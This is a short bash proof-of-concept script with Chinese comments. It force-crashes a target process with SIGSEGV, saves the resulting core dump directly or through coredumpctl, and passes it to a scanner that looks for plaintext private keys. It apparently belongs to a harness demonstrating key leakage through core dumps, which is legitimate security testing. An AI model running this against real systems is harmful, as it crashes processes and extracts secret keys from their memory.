#!/usr/bin/env bash
# 场景 1：core dump 提取
# 进程崩溃后 core 文件落盘 → 扫描明文私钥
#
# 前置: ulimit -c unlimited; core_pattern 允许落盘（或 systemd-coredump）
# 用法: ./dump-core.sh <pid>
set -euo pipefail
PID="${1:?usage: dump-core.sh <pid>}"
OUT="core.${PID}.bin"

echo "[dump-core] signaling PID $PID to crash with core dump..."
# 需要进程 core limit 为 unlimited（victim 启动前: ulimit -c unlimited）
kill -SEGV "$PID" || true
sleep 2

# 兼容两种 core 落盘路径
if compgen -G "core" >/dev/null; then
  mv core "$OUT"
elif command -v coredumpctl >/dev/null && coredumpctl list "$PID" >/dev/null 2>&1; then
  coredumpctl dump "$PID" --output="$OUT" >/dev/null
else
  echo "[dump-core] no core file produced (core_pattern / ulimit) — see README" >&2
  exit 3
fi

echo "[dump-core] core saved: $OUT ($(stat -c%s "$OUT") bytes)"
node scan-dump.mjs "$OUT" marker.fullkey.txt
